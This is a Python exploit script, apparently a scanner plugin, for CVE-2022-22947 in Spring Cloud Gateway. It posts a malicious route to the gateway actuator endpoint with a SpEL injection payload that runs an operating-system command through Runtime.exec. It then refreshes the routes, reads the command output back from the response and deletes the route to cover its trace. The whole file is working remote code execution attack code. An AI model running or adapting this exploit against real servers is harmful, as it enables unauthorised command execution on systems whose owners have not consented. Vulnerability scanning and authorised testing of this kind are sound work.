import json
import random
import re

import requests


class Exploit(object):

    def attack(self, url):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML'
                          ', like Gecko) Chrome/62.0.3202.89 Safari/537.36',
            'Content-Type': 'application/json'
        }
        route_name = "".join([str(x) for x in random.choices(range(1, 10), k=6)])
        # print(route_name)
        bad_request_1 = requests.post(
            url + "/actuator/gateway/routes/{}".format(route_name),
            headers=headers,
            data=json.dumps({
                "id": "hacktest",
                "filters": [{
                    "name": "AddResponseHeader",
                    "args": {"name": "Result", "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToB"
                                                        "yteArray(T(java.lang.Runtime).getRuntime().exec(new S"
                                                        "tring[]{\"id\"}).getInputStream()))}"}
                }],
                "uri": "http://example.com",
                "order": 0
            })
        )
        # print(bad_request_1.status_code, bad_request_1.text)

        bad_request_2 = requests.post(
            url + "/actuator/gateway/refresh",
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                              "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
            }
        )
        # print(bad_request_2.status_code, bad_request_1.text)
        good_request = requests.get(
            url + "/actuator/gateway/routes/{}".format(route_name)
        )

        delete_request = requests.delete(
            url + "/actuator/gateway/routes/{}".format(route_name),
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Apple"
                              "WebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
            }
        )
        m = re.search(r'AddResponseHeader Result = \'(.*?)\'', good_request.text)
        if m:
            return "CVE-2022-22947: SPEL CASTING AND EVIL BEANS {} [{}]".format(url, m.group(1).strip())


if __name__ == '__main__':
    print(Exploit().attack("http://localhost:8080"))
